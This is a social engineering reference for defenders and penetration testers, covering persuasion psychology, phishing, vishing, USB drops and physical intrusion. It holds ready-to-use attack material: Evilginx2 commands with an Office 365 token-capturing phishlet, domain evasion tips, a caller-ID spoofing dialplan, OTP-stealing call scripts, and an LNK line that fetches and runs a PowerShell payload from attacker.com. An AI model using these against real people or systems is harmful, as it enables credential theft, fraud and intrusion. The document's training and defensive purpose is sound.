# Social Engineering Reference

> **Scope:** This document is a cybersecurity reference for defenders, penetration testers, security awareness trainers, and researchers. All techniques are presented in the context of understanding threats so they can be detected, prevented, and defended against. Offensive use against systems or individuals without explicit written authorization is illegal and unethical.

---

## Table of Contents

1. [Psychology of Social Engineering](#1-psychology-of-social-engineering)
2. [Phishing Attack Types](#2-phishing-attack-types)
3. [Phishing Infrastructure and Tooling](#3-phishing-infrastructure-and-tooling)
4. [Vishing and Phone-Based Attacks](#4-vishing-and-phone-based-attacks)
5. [Physical Social Engineering](#5-physical-social-engineering)
6. [Spear Phishing Campaign Methodology](#6-spear-phishing-campaign-methodology)
7. [Security Awareness Training](#7-security-awareness-training)
8. [Technical Countermeasures](#8-technical-countermeasures)
9. [BEC (Business Email Compromise) Defense](#9-bec-business-email-compromise-defense)
10. [Regulatory and Compliance](#10-regulatory-and-compliance)
11. [MITRE ATT&CK Mapping](#11-mitre-attck-mapping)
12. [Quick Reference Checklists](#12-quick-reference-checklists)

---

## 1. Psychology of Social Engineering

Social engineering exploits human psychology rather than technical vulnerabilities. Understanding the underlying cognitive mechanisms is essential for both mounting realistic assessments and constructing effective defenses.

### 1.1 Cialdini's Six Principles of Influence

Robert Cialdini's seminal research in *Influence: The Psychology of Persuasion* (1984, updated 2021) identified six universal principles that skilled social engineers weaponize routinely.

#### 1.1.1 Reciprocity

Humans feel obligated to return favors. When someone does something for us — even something we did not ask for — we feel psychological pressure to reciprocate.

**Attack application:**
- An attacker posing as IT support "helps" a user reset their password or resolve a ticket, then later calls back and asks the user to confirm a code they just received by SMS. The user, feeling indebted, complies — handing over an OTP.
- "Free" USB drives left in parking lots as gifts. Recipients plug them in out of curiosity and gratitude.
- Phishing emails that begin with genuinely useful information (e.g., a real industry report attachment) before embedding a credential-harvesting link.

**Defensive awareness:**
- Recognize that unsolicited help is not neutral. Establish formal processes for IT support interactions.
- Out-of-band verification: if someone calls you and helps you, call them back on a known-good number before sharing any sensitive information.

#### 1.1.2 Commitment and Consistency

Once people commit to a position — especially publicly — they feel pressure to remain consistent with that commitment. Small initial agreements pave the way for larger requests (foot-in-the-door technique).

**Attack application:**
- Pretexting calls begin with innocuous confirmation ("Can you confirm your first name and department?") before escalating ("And the last four of your employee ID?").
- Spear phishing emails reference a LinkedIn post the target made, asking them to "follow up on the commitment you made about [topic]."
- Attackers build rapport over weeks via LinkedIn before launching a credential-theft attack.

**Defensive awareness:**
- Recognize escalating commitment patterns in requests.
- Train employees that it is always acceptable to stop mid-interaction and escalate to a supervisor or security team.

#### 1.1.3 Social Proof

People look to others' behavior to determine the correct course of action, especially in uncertain situations.

**Attack application:**
- Phishing emails: "Over 300 of your colleagues have already updated their credentials — please click here to complete your profile update."
- Fake review campaigns to legitimize malicious software ("4.8 stars, 12,000 downloads").
- Fabricated urgency indicators: "47 other people are viewing this document right now."
- Vishing callers claim "we already verified this with your manager."

**Defensive awareness:**
- Question claims about what "everyone else" is doing when they are used to pressure action.
- Verify claimed actions with named individuals through independent channels.

#### 1.1.4 Authority

People defer to perceived authority figures, titles, and symbols of expertise or rank.

**Attack application:**
- CEO fraud / Business Email Compromise: impersonating the CEO or CFO to pressure a finance employee into an unauthorized wire transfer.
- Vishing calls: "This is Agent Thompson from the IRS fraud division."
- Phishing emails with forged law firm letterhead, FBI logos, or Microsoft branding.
- Physical impersonation: uniforms (delivery, IT, fire marshal), clipboards, lanyards with fake ID badges.

**Defensive awareness:**
- Establish and enforce verification procedures that apply equally regardless of claimed authority.
- Senior executives should explicitly communicate that they will never demand employees bypass security controls.
- Caller verification: "I'll need to call you back on our directory number for that department."

#### 1.1.5 Liking

We are more easily persuaded by people we like. Factors that increase liking: physical attractiveness, similarity, compliments, familiarity, and association with positive things.

**Attack application:**
- Attackers mirror language, interests, and cultural references found on social media to appear similar to the target.
- LinkedIn connection followed by flattery ("I've been following your work on X and really admire your expertise") before a spear-phishing message.
- Physical attackers dress in clothing that matches the target company's culture.
- Pretexting using mutual connections: "Sarah from your team gave me your name."

**Defensive awareness:**
- Being liked is not a credential. Apply the same verification standards to friendly callers as to hostile ones.
- Train staff to recognize when unusual requests are being softened by excessive friendliness.

#### 1.1.6 Scarcity

People assign more value to opportunities that are rare or diminishing. Fear of missing out (FOMO) is a powerful motivator.

**Attack application:**
- Urgency phishing: "Your account will be suspended in 24 hours if you do not verify your information."
- Invoice fraud: "Final notice — payment overdue, legal action commences tomorrow."
- Limited-time credential harvesting: "Only the first 10 employees to re-authenticate get the upgraded account."
- "Act now" overlays on phishing landing pages.

**Defensive awareness:**
- Artificial urgency is a major red flag. Legitimate systems rarely require immediate irreversible action.
- Establish cooling-off procedures: financial requests over a threshold require a 24-hour verification window.

---

### 1.2 Cognitive Biases Exploited by Social Engineers

Cognitive biases are systematic patterns of deviation from rational judgment. Social engineers exploit them because they operate largely below the level of conscious awareness.

#### 1.2.1 Anchoring Bias

The tendency to rely too heavily on the first piece of information encountered when making decisions.

**Attack application:** An attacker presents a seemingly high initial request ("We need full admin credentials") before backing off to the real ask ("Okay, just read access to the finance share"). The target, relieved to avoid the larger ask, grants what they would not have otherwise.

#### 1.2.2 Availability Heuristic

Overestimating the likelihood of events that come easily to mind, often due to recent exposure or emotional impact.

**Attack application:** After a real data breach announcement in the news, attackers launch a phishing campaign impersonating the breached company: "Due to the recent incident, please re-verify your credentials immediately." Victims are primed to find this plausible.

#### 1.2.3 Framing Effect

Decisions are influenced by how information is presented, not just its content.

**Attack application:**
- "Your account shows suspicious activity" (threat frame) vs. "Please confirm your details to keep your account secure" (positive frame) — both lead to the same credential submission page, but the second feels safer.
- Financial fraud: "Approve this payment to avoid a $5,000 late fee" is more effective than "Approve this payment."

#### 1.2.4 Confirmation Bias

The tendency to search for, interpret, and recall information that confirms pre-existing beliefs.

**Attack application:** Attackers research a target's known concerns or interests and frame their pretext around them. If a company is known to be undergoing an audit, an attacker posing as an auditor's assistant will be readily believed.

#### 1.2.5 Optimism Bias

The belief that negative events are less likely to happen to oneself than to others.

**Attack application:** Most employees believe they are too savvy to fall for phishing — making them less vigilant. Security awareness programs must address this directly.

#### 1.2.6 Authority Bias (see Cialdini above)

People tend to believe authority figures are correct, even when they have no independent evidence.

---

### 1.3 Pretexting: Building Believable Cover Identities

Pretexting is the practice of creating a fabricated scenario (pretext) to extract information or gain access. It is the narrative layer of social engineering.

**Elements of a successful pretext:**

| Element | Description | Example |
|---------|-------------|---------|
| Role | Plausible identity with legitimate need for the information | IT auditor, HR representative, vendor account manager |
| Backstory | Coherent history that supports the role | "We're migrating from the old ticketing system — I was assigned your account to verify" |
| Knowledge | Insider details that build credibility | Employee names, project names, recent events gleaned from OSINT |
| Hook | The specific reason for the ask | "Without your verification, your account gets locked out of the new system tonight" |
| Exit | How to end the interaction gracefully | "Perfect, that's all I needed — you're all set in the new system" |

**Common pretext scenarios:**

- **IT helpdesk:** "We detected unusual login activity on your account. I need to verify a few things to prevent a lockout."
- **HR department:** "We're updating employee records for the new benefits portal. I need to confirm your SSN and home address."
- **Vendor support:** "I'm calling from [SaaS vendor]. We're migrating your account data and need to verify the admin credentials."
- **Executive assistant:** "Mr. [CEO name] asked me to reach you directly. He needs this wire processed today before his flight."
- **Auditor/compliance:** "I'm conducting the annual security audit. I'll need to review your workstation briefly."
- **New employee:** Uses naivety as cover — asking for "help" performing actions that reveal system information.

**Research sources for pretexts (OSINT):**
- LinkedIn: employee names, org chart, job titles, projects, technologies used
- Company website: press releases, executive names, recent acquisitions
- Job postings: technology stack, processes, vendors
- Financial filings (SEC EDGAR): M&A activity, auditors, legal counsel
- Court records, domain WHOIS, certificate transparency logs

---

### 1.4 Rapport Building Techniques and Defensive Awareness

Rapport is the foundation of effective social engineering. It reduces target skepticism and increases compliance.

**Rapport techniques:**

- **Active mirroring:** Subtly mimicking the target's tone, vocabulary, and pace.
- **Commonality discovery:** Referencing shared experiences, colleagues, or interests discovered via OSINT.
- **Vulnerability signaling:** Appearing slightly uncertain or in need of help disarms defensive instincts.
- **Name use:** Using the target's first name naturally creates false familiarity.
- **Validation:** "That's a great question" or "You're absolutely right about that" before pivoting.

**Defensive awareness for employees:**
1. **Verify before trusting:** Friendliness is not a credential. Apply verification procedures consistently.
2. **Recognize the escalation pattern:** Small talk → credibility building → the ask. Recognize when a conversation follows this arc.
3. **Pause before acting:** Social engineers rely on momentum. Breaking the flow to "check on something" kills the attack.
4. **It is okay to say no:** Employees should be empowered to decline requests and escalate to security without fear.
5. **Document and report:** Even failed social engineering attempts are valuable threat intelligence.

---

## 2. Phishing Attack Types

Phishing is the use of fraudulent electronic communications to trick recipients into revealing sensitive information, installing malware, or taking actions that benefit the attacker.

### 2.1 Spear Phishing

Unlike bulk phishing (spray-and-pray), spear phishing is highly targeted and personalized.

**Target research methodology:**
1. Identify target via LinkedIn, company directory, or breach data
2. Harvest email format (e.g., `first.last@company.com`) using hunter.io, email permutation, or breach databases
3. Collect context: current projects, reporting structure, recent news, vendor relationships
4. Craft a pretext aligned with the target's role and current activities
5. Personalize the email: reference real names, project names, locations

**Personalization techniques:**
- Use the target's manager's name in the salutation
- Reference a real ongoing project or initiative
- Match the writing style of internal communications (gleaned from public sources)
- Include partial information the target would assume only an insider could know
- Use the target's actual email signature format

**OSINT sources for spear phishing:**
- LinkedIn: role, connections, skills, recent activity
- Twitter/X, Facebook: interests, travel, events attended
- GitHub: technical stack, coding patterns, personal projects
- Company blog/press releases: project names, partnerships
- Conference speaker bios: expertise, speaking topics

**Example spear phishing email structure:**

```
From: sarah.chen@[lookalike-domain].com
Subject: Re: Q3 Budget Review — Action Required

Hi [Target Name],

Following up on our conversation from the all-hands last week — James asked me to
send over the updated budget template before Friday's close. Please review and
return with your department figures.

[Malicious link labeled "Q3_Budget_Template_v2.xlsx"]

Thanks,
Sarah Chen
Finance Operations
Direct: (555) 012-3456
```

---

### 2.2 Whaling (Executive Targeting)

Whaling targets C-suite and senior executives who have access to high-value systems, financial authority, and sensitive data.

**Characteristics:**
- Highly personalized — often researched for weeks or months
- Leverages public information (earnings calls, press releases, LinkedIn)
- Targets not just the executive but also their assistants and direct reports
- Often culminates in Business Email Compromise (BEC) attempts

**BEC (Business Email Compromise)** is a category of fraud in which attackers impersonate executives or trusted parties to authorize fraudulent financial transactions.

**BEC variants:**

| Variant | Description | Target |
|---------|-------------|--------|
| CEO Fraud | Impersonate CEO to demand urgent wire transfer | CFO, Finance staff |
| Vendor Impersonation | Compromise or spoof vendor email, request payment redirect | AP Department |
| Payroll Redirect | Impersonate employee, redirect payroll to attacker account | HR/Payroll |
| W-2 Scam | Impersonate CEO/HR, request employee W-2 data | HR/Finance |
| Attorney Impersonation | Impersonate company's legal counsel for "confidential" transfers | CFO/Executives |
| Real Estate Wire Fraud | Intercept closing communications, redirect down payment | Home buyers, attorneys |

---

### 2.3 Vishing (Voice Phishing)

Vishing uses telephone calls to extract information or persuade targets to take action.

**Common vishing scenarios:**
- Bank fraud alert: "We detected suspicious activity on your account"
- IRS impersonation: threat of arrest unless immediate payment
- IT helpdesk: "Your account has been locked — I need to verify your identity"
- Microsoft/Apple Support: "We detected a virus on your computer"
- Medicare/Social Security: "Your number has been suspended"

**Technical enablers:**
- **Caller ID spoofing:** Free and commercial services allow any number to be displayed
- **VoIP infrastructure:** Low-cost calls from anywhere globally
- **Voice cloning:** AI tools can clone a voice from as little as 3-5 seconds of audio

**Real-time phishing coordination:**
Some vishing attacks operate in concert with phishing emails. The attacker sends a phishing email, then calls the target claiming to be from the same organization, creating a multi-channel attack that is more convincing.

---

### 2.4 Smishing (SMS Phishing)

Smishing uses SMS/text messages to deliver phishing content.

**Why smishing works:**
- SMS open rates are ~98% vs ~20% for email
- Mobile users are less likely to scrutinize URLs
- SMS lacks the spam filtering infrastructure of email
- Legitimate organizations increasingly communicate via SMS (banks, delivery companies)
- Shortened URLs hide true destinations

**Common smishing pretexts:**
- Package delivery notifications (FedEx, UPS, USPS, DHL)
- Bank security alerts
- Two-factor authentication "verification" (fake OTP capture pages)
- Prize/sweepstakes notifications
- COVID-era: health authority notifications

**Technical tactics:**
- URL shorteners (bit.ly, t.co, tinyurl) to hide destination
- Mobile-optimized phishing pages
- Legitimate-looking subdomain abuse (e.g., `fedex.tracking-update[.]com`)
- SIM swapping to intercept SMS OTPs

---

### 2.5 Quishing (QR Code Phishing)

QR code phishing embeds malicious URLs in QR codes, bypassing email security scanners that analyze text and URLs but not image content.

**Why quishing evades defenses:**
- Email gateways perform URL analysis on text links, not image-embedded URLs
- QR codes appear legitimate and are widely used for menus, payments, documents
- Users scan QR codes on mobile devices where protections are weaker
- No hover-preview equivalent exists for QR codes

**Common quishing scenarios:**
- Email attachments with "scan this QR code to verify your identity"
- QR codes on physical stickers placed over legitimate QR codes (parking meters, restaurant menus)
- QR codes in PDF attachments that bypass attachment scanning
- Fake DocuSign/Adobe Sign requests with QR verification

**Defenses:**
- Email security solutions with QR code URL extraction and analysis
- User training: treat QR code URLs with the same scrutiny as text links
- Physical security: regularly inspect physical QR codes in public-facing areas

---

### 2.6 Clone Phishing

Clone phishing replicates a legitimate email — including formatting, branding, and sender details — replacing benign attachments or links with malicious ones.

**Process:**
1. Attacker obtains a copy of a legitimate email (via breach, public exposure, or by being on a mailing list)
2. Creates a near-identical replica using a spoofed or lookalike sender address
3. Replaces legitimate links/attachments with malicious versions
4. Sends to original recipients with a plausible re-send reason ("resending — the attachment was corrupted")

**Why it works:**
- Targets have seen the legitimate version and recognize it
- Branding, formatting, and content match expectations
- The re-send pretext is plausible

---

### 2.7 Adversary-in-the-Middle (AiTM) Phishing

AiTM phishing defeats MFA by sitting as a transparent proxy between the victim and the legitimate service, capturing session cookies in real time.

**How AiTM works:**
1. Victim receives phishing link to attacker-controlled reverse proxy
2. Proxy forwards all traffic to the legitimate site
3. Victim authenticates (including MFA) to what appears to be the real site
4. Proxy captures the post-authentication session cookie
5. Attacker replays the cookie for authenticated access — bypassing MFA entirely

**Tools used in AiTM attacks:**

| Tool | Description |
|------|-------------|
| Evilginx2 | Go-based reverse proxy phishing framework, phishlet-based |
| Modlishka | Reverse proxy with built-in credential capture |
| Muraena | Modular reverse proxy phishing framework |
| EvilnoVNC | VNC-based AiTM for visual phishing sessions |

**Targets:** Microsoft 365, Google Workspace, any service using cookie-based sessions after MFA.

**Defenses:**
- FIDO2/hardware security keys (phishing-resistant MFA — session cannot be proxied)
- Conditional Access policies requiring compliant/joined devices
- Continuous Access Evaluation (CAE) in Microsoft 365
- Token binding where supported

---

## 3. Phishing Infrastructure and Tooling

### 3.1 GoPhish: Open-Source Phishing Simulation Framework

GoPhish is the de facto standard for security awareness phishing simulations. It provides campaign management, email sending, landing page hosting, and result tracking.

**Deployment:**

```bash
# Download latest release from https://github.com/gophish/gophish/releases
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish
./gophish
# Default admin interface: https://127.0.0.1:3333
# Default credentials: admin / (printed to terminal on first run)
```

**Configuration components:**

| Component | Description |
|-----------|-------------|
| Sending Profile | SMTP relay configuration, sending address, email headers |
| Landing Page | HTML phishing page with optional credential capture and redirect |
| Email Template | HTML email body with GoPhish tracking variables |
| User Group | Target email list (CSV import supported) |
| Campaign | Ties all components together with schedule and URL |

**GoPhish template variables:**

```
{{.FirstName}}    - Recipient first name
{{.LastName}}     - Recipient last name
{{.Email}}        - Recipient email
{{.From}}         - Sending address
{{.TrackingURL}}  - Unique tracking URL (embedded in images for open tracking)
{{.URL}}          - Unique phishing URL for this recipient
```

**Tracking metrics:**
- **Emails Sent:** Total delivery count
- **Opens:** Tracking pixel loads (indicates email was opened)
- **Clicks:** Landing page visits
- **Submitted Data:** Credential form submissions
- **Email Reported:** Reported via PhishAlert button integration

**API usage (automation):**

```python
import requests

API_KEY = 'your-gophish-api-key'
BASE = 'http://localhost:3333/api'
HEADERS = {'Authorization': f'Bearer {API_KEY}'}

# List campaigns
campaigns = requests.get(f'{BASE}/campaigns/', headers=HEADERS).json()

# Create campaign
campaign = {
    "name": "Q4 Awareness Test",
    "template": {"id": 1},
    "url": "https://phish.internal.example.com",
    "page": {"id": 1},
    "smtp": {"id": 1},
    "groups": [{"id": 1}],
    "launch_date": "2024-01-15T09:00:00+00:00"
}
requests.post(f'{BASE}/campaigns/', headers=HEADERS, json=campaign)
```

---

### 3.2 Domain Selection and Evasion

Choosing the right phishing domain is critical for campaign success and operational security.

**Typosquatting techniques:**

| Technique | Example (target: company.com) |
|-----------|-------------------------------|
| Character substitution | cornpany.com (rn → m) |
| Character transposition | comapny.com |
| Homograph attack | соmpany.com (Cyrillic "о") |
| Subdomain abuse | company.com.attacker.net |
| Hyphenation | company-login.com |
| TLD variation | company.net, company.org, company.co |
| Prefix/suffix | securecompany.com, company-portal.com |
| Lookalike TLD | company.corn (new TLD) |

**Homograph attacks** exploit Unicode characters that look identical to ASCII. For example, the Cyrillic letter "а" (U+0430) is visually identical to the Latin "a" (U+0061).

**Domain categorization evasion:**
- Age the domain 30-60 days before use (new domains are high-risk)
- Configure the domain as a benign category site initially (travel blog, recipe site)
- Submit to Bluecoat, Webroot, and Fortinet category requests as legitimate
- Use domains with established reputation (expired domains with clean history)

**Operational security:**
- Register through a privacy-preserving registrar or use a reseller
- Use different registrars and hosting for each campaign
- Implement geofencing to only serve malicious content to target IP ranges
- Redirect non-target IPs to benign content

---

### 3.3 SSL Certificate Acquisition

Phishing sites use HTTPS to appear legitimate and avoid browser warnings.

```bash
# Let's Encrypt via Certbot
apt install certbot python3-certbot-nginx
certbot --nginx -d phish.lookalike-domain.com

# Wildcard certificate (requires DNS challenge)
certbot certonly --manual --preferred-challenges dns \
  -d "*.lookalike-domain.com"

# Certificate renewal
certbot renew --pre-hook "nginx -s stop" --post-hook "nginx"
```

**Note for defenders:** The presence of HTTPS (padlock) does NOT indicate a site is legitimate — only that the connection is encrypted. Certificate Transparency logs (crt.sh) can be monitored for newly issued certificates for lookalike domains.

---

### 3.4 Email Header Spoofing and SPF/DKIM/DMARC Bypass

**SPF (Sender Policy Framework)** specifies which IP addresses are authorized to send email for a domain.

**DKIM (DomainKeys Identified Mail)** provides a cryptographic signature verifying the email was sent by the domain and not modified in transit.

**DMARC (Domain-based Message Authentication, Reporting & Conformance)** ties SPF and DKIM together and specifies what to do with failing messages.

**Bypass techniques (for authorized testing):**

| Technique | Description |
|-----------|-------------|
| Lookalike domain | Register similar domain, set up valid SPF/DKIM/DMARC — passes all checks |
| Display name spoofing | Set display name to "CEO Name" with any sending address |
| Subdomain spoofing | Subdomain may not inherit parent DMARC policy |
| Header injection | Inject additional From headers in some legacy mail servers |
| Email provider abuse | Use legitimate provider (Gmail, Outlook) with target's display name |

**Checking email authentication:**

```bash
# Check SPF record
dig TXT company.com | grep spf

# Check DMARC record
dig TXT _dmarc.company.com

# Check DKIM selector (replace 'selector1' with actual selector)
dig TXT selector1._domainkey.company.com

# Send a test and analyze headers
# Look for: Authentication-Results: header
# dmarc=pass/fail, spf=pass/fail, dkim=pass/fail
```

---

### 3.5 Evilginx2: Reverse Proxy Phishing

Evilginx2 is a man-in-the-middle attack framework used in penetration testing to capture session cookies from authenticated sessions, bypassing MFA.

```bash
# Installation
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

# Launch with custom phishlets directory
./bin/evilginx -p ./phishlets/

# Evilginx2 terminal commands
# Configure domain
config domain phish.target-login.com

# Configure external IP
config ip 203.0.113.10

# Set up phishlet for Office 365
phishlets hostname o365 login.target-login.com
phishlets enable o365

# Create a lure (campaign URL)
lures create o365
lures get-url 0

# Monitor captured sessions
sessions
sessions 1    # View session details including cookies
```

**Phishlet structure (YAML):**

```yaml
name: 'Office 365'
author: '@kgretzky'
min_ver: '2.3.0'

proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true}

sub_filters:
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com',
     search: 'login.microsoftonline.com', replace: '{hostname}', mimes: ['text/html', 'application/javascript']}

auth_tokens:
  - domain: '.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
  - domain: '.office.com'
    keys: ['SSOTOKEN']

credentials:
  username:
    key: 'login'
    search: '(.+)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.+)'
    type: 'post'
```

---

### 3.6 Phishing Email HTML Crafting and Tracking

**HTML email structure for phishing simulations:**

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="font-family: Segoe UI, Arial, sans-serif; background: #f4f4f4; margin:0; padding:20px;">
  <table width="600" cellpadding="0" cellspacing="0" style="background:#fff; margin:auto;
         border:1px solid #ddd; border-radius:4px;">
    <tr>
      <td style="background:#0078d4; padding:20px; text-align:center;">
        <!-- Company logo goes here -->
        <img src="https://logo.example.com/logo.png" height="40" alt="Company">
      </td>
    </tr>
    <tr>
      <td style="padding:30px;">
        <h2 style="color:#333;">Action Required: Verify Your Account</h2>
        <p>Dear {{.FirstName}},</p>
        <p>We have detected unusual sign-in activity on your account.
           Please verify your identity to restore full access.</p>
        <p style="text-align:center;">
          <a href="{{.URL}}" style="background:#0078d4; color:#fff; padding:12px 30px;
             text-decoration:none; border-radius:4px; display:inline-block;">
            Verify My Account
          </a>
        </p>
        <p style="color:#666; font-size:12px;">
          If you did not request this, please ignore this email.<br>
          This link expires in 24 hours.
        </p>
      </td>
    </tr>
  </table>
  <!-- Tracking pixel -->
  <img src="{{.TrackingURL}}" width="1" height="1" style="display:none;">
</body>
</html>
```

**Tracking pixels:** A 1x1 transparent image loaded from the attacker's server. Each load includes a unique token, enabling per-recipient open tracking.

---

## 4. Vishing and Phone-Based Attacks

### 4.1 Vishing Call Scripts

**IT Helpdesk Impersonation Script:**

```
Attacker: "Hi, this is Marcus from the IT Help Desk. Am I speaking with [target name]?"
Target: "Yes, this is [name]."
Attacker: "Great. I'm calling because our security monitoring flagged an unusual login
           attempt on your account from an IP in Eastern Europe about 20 minutes ago.
           Did you just log in from a different location?"
Target: "No, I've been here at my desk all day."
Attacker: "That's what I was afraid of. We need to secure your account right away.
           I'm going to send you an authentication code via text — can you read that
           back to me so I can verify your account ownership before we lock the
           suspicious session out?"
[Target receives real OTP sent by the attacker attempting to log in to their account]
Target: "It says 847293."
Attacker: "Perfect, you're all set. We've blocked that session. You may want to
           change your password when you get a chance. Is there anything else I can
           help you with today?"
```

**Bank Fraud Alert Script:**

```
Attacker: "This is an automated fraud alert from [Bank Name] security. We've placed
           a temporary hold on your account due to suspicious transactions.
           Please press 1 to speak with a fraud specialist immediately, or press 2
           to dismiss this alert."
[If target presses 1]
Attacker: "Thank you for calling the fraud line. I have your account here. For
           security purposes I'll need to verify your identity. Can you confirm the
           last four digits of your Social Security Number?"
```

---

### 4.2 Caller ID Spoofing

Caller ID spoofing allows attackers to display any phone number to the recipient.

**Methods:**
- **Commercial spoofing services:** SpoofCard, SpoofTel, Caller ID Faker — web/app interfaces
- **VoIP platforms:** Asterisk, FreeSWITCH — configure arbitrary CallerID in SIP headers
- **SIP INVITE manipulation:** Set the "From" header in SIP INVITE to any number

```
# Asterisk dialplan (extensions.conf)
exten => _X.,1,Set(CALLERID(num)=8005551234)
exten => _X.,2,Set(CALLERID(name)=Microsoft Support)
exten => _X.,3,Dial(SIP/provider/${EXTEN})
```

**Defenses:**
- STIR/SHAKEN (Secure Telephone Identity Revisited / Signature-based Handling of Asserted information using toKENs): FCC-mandated framework for caller ID attestation
- Never trust caller ID alone — call back on a verified number
- Train employees that caller ID can be faked

---

### 4.3 Voice Cloning and Deepfake Audio

AI-powered voice cloning can replicate a person's voice from a short audio sample.

**Commercial tools:**
- ElevenLabs: high-fidelity voice cloning from ~1 minute of audio
- Resemble AI: voice cloning API for developers
- PlayHT: text-to-speech with voice cloning

**Open-source tools:**
- Coqui TTS: open-source text-to-speech with voice cloning
- Real-Time-Voice-Cloning: one-shot voice cloning GitHub project
- Whisper + TTS pipeline: transcribe → synthesize in target's voice

**Attack scenarios:**
- Clone a CEO's voice, call CFO with urgent wire transfer request
- Clone an employee's voice to authorize access with a helpdesk
- Create fake audio evidence in social engineering scenarios

**Real-world incidents:**
- 2019: UK energy company CEO was tricked into transferring €220,000 after a call using AI-cloned voice of the parent company's CEO
- 2020: Dubai bank manager deceived by deepfake voice into approving $35M transfer

**Defenses:**
- Establish voice-based transaction code words (safe words) for high-value actions
- Out-of-band verification for financial requests regardless of voice recognition
- Employee awareness that voice cloning is technically feasible

---

### 4.4 OTP Interception Attacks (Real-Time Phishing)

**How it works:**
1. Attacker sends target to a reverse proxy phishing page (Evilginx, custom)
2. Target enters credentials, which are forwarded in real time to the legitimate site
3. Legitimate site triggers MFA (SMS OTP, email OTP, push notification)
4. Target enters OTP on the phishing page, which is immediately forwarded
5. Attacker gains authenticated session — the OTP is valid for only a short window, requiring real-time coordination

**Coordination tools:**
- Telegram bots for real-time operator notification
- Custom phishing kits with WebSocket-based live feed to attacker dashboard
- "OTP bot" services on cybercriminal forums — automate the callback

**Defenses:**
- FIDO2/WebAuthn hardware keys: origin-bound, cannot be relayed to a different domain
- Passkeys: same protection as FIDO2 with consumer UX
- Number matching for push MFA (Microsoft Authenticator, Duo)

---

### 4.5 Pretexting Scenarios for Phone Attacks

| Pretext | Target Role | Key Information Sought |
|---------|-------------|------------------------|
| IT emergency | Any employee | Password reset, MFA bypass |
| HR onboarding | New hire | SSN, banking info, network credentials |
| Vendor account review | AP/Finance | Payment account details |
| Audit preparation | Compliance/Finance | System access, financial data |
| Executive assistant | Executive | Calendar, meeting details, travel plans |
| Facilities emergency | Building management | Physical access codes, camera locations |

---

## 5. Physical Social Engineering

### 5.1 Tailgating and Piggybacking

**Tailgating:** Following an authorized person through a secure door without their knowledge.
**Piggybacking:** Following through with the authorized person's knowledge (and often consent).

**Techniques:**
- Approach door while an authorized employee is entering, appear to be searching for badge
- Carry boxes, equipment, or a coffee tray to make holding the door seem polite
- Dress in a uniform that suggests legitimate access (IT, maintenance, delivery)
- Time entry during high-traffic periods (shift change, morning rush) when badge checking is less rigorous
- Create a diversion to draw attention away from the access point

**Success rate data (security assessments):**
Studies and red team assessments consistently find tailgating success rates of 70-90% in facilities without anti-tailgating procedures, even when employees are aware of the risk.

**Physical Access Control System (PACS) weaknesses:**
- Request-to-exit (REX) sensors can be triggered remotely with IR or magnets
- Doors with delayed closing or "door held" alarms that are routinely ignored
- Mantrap/airlock bypass through social engineering
- Badge cloning (RFID): low-frequency HID cards (125 kHz) cloneable with Proxmark3

---

### 5.2 Impersonation

**Cover identities used in physical assessments:**

| Identity | Props Needed | Access Level Typically Gained |
|----------|--------------|-------------------------------|
| IT contractor | Laptop bag, fake badge, polo shirt | Server rooms, workstations |
| Delivery person | Uniform, package, clipboard | Reception, sometimes back areas |
| Fire marshal / Safety auditor | Clipboard, hi-vis vest, fake ID | Most areas — people defer to safety |
| HVAC / Maintenance | Toolbox, work order (fake), uniform | Mechanical rooms, crawlspaces |
| Job candidate | Business clothes, interview confirmation email | Reception, sometimes escorted into offices |
| New employee | Employee handbook (fake), badge (real company's format) | General office areas |

**Fake credential materials:**
- Badge printers: Zebra, Matica — create convincing ID badges from template research
- Company logo: available from press kits, brochures, job postings
- Template research: look at employee LinkedIn profile photos for badge design clues
- Lanyards: company colors/branding often obtainable inexpensively

---

### 5.3 USB Drop Attacks

Malicious USB devices left in parking lots, lobbies, or mailed to targets exploit human curiosity.

**Types of malicious USB devices:**

| Device | Description | Capability |
|--------|-------------|------------|
| Rubber Ducky (Hak5) | Appears as keyboard HID device | Executes keystrokes at 1000 WPM, runs payloads in seconds |
| OMG Cable | Looks exactly like a legitimate USB-C cable | Remote WiFi access, keylogger, payload delivery |
| Bash Bunny | Multi-function attack platform | HID, network, storage attacks |
| WHID Implant | WiFi-controlled HID | Remote payload execution via WiFi |
| Teensy | Programmable microcontroller | Custom HID attacks |
| Poisoned USB storage | Standard flash drive with malware | AutoRun (older Windows), LNK file attacks |

**AutoRun/LNK payload:**

```
; autorun.inf (Windows XP/Vista era - deprecated but still used in some environments)
[AutoRun]
open=payload.exe
icon=setup.ico
label=USB Drive

' LNK-based attack (modern Windows)
' A .lnk shortcut with malicious target:
' Target: C:\Windows\System32\cmd.exe /c powershell -WindowStyle Hidden -exec bypass -c IEX(IWR 'http://attacker.com/p.ps1')
' Icon: matching the expected file type icon
```

**Research findings:** A 2016 University of Illinois study found that 45-98% of dropped USB drives were plugged in by finders, with many also opening files.

**Defenses:**
- USB port blocking via Group Policy or endpoint DLP (block unauthorized storage)
- Physical USB port locks
- Employee training: never plug in found USB drives
- Endpoint detection for HID attacks (e.g., LimaCharlie, CrowdStrike USB policies)
- Disable AutoRun/AutoPlay via Group Policy

---

### 5.4 Dumpster Diving

Recovering sensitive information from discarded materials.

**Valuable discarded materials:**
- Printed emails, reports, org charts
- Old access badges (contain format information for cloning/replication)
- Network diagrams, IP address lists, system documentation
- Shredded documents (cross-cut shredding minimizes but does not eliminate risk)
- Hard drives (even "wiped" drives may retain data without secure erasure)
- Post-it notes (often contain passwords)
- Printouts of internal directory listings

**Legal note:** In the US, items in public trash may generally be recovered without legal restriction (California v. Greenwood, 486 U.S. 35, 1988), but laws vary by jurisdiction. Physical trespass to access private dumpsters is illegal.

**Defenses:**
- Cross-cut or micro-cut shredder mandatory for all documents
- Clear desk policy
- Secure document destruction bins with locked collection
- Hard drive degaussing + physical destruction before disposal
- Badge destruction procedures upon termination

---

